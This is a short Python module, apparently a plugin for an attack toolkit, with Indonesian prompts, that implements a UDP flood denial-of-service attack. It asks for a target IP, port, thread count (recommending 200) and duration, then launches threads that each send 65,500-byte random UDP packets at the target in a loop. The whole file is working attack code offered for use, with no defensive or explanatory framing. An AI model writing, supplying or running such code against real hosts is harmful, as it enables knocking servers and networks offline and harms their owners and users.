DESCRIPTION = "UDP Flood Attack"
def run():
    import socket, threading, random, time
    target = input("Target IP: ")
    port = int(input("Port: "))
    threads_count = int(input("Threads (rekomendasi 200): "))
    duration = int(input("Duration (detik): "))
    
    print(f"[*] Menyerang {target}:{port} | {threads_count} Threads | {duration}s")
    sent = [0]
    
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(65500)
        end = time.time() + duration
        while time.time() < end:
            try:
                sock.sendto(payload, (target, port))
                sent[0] += 1
            except:
                pass
    
    for _ in range(threads_count):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"[+] Selesai. ~{sent[0]} paket terkirim.")
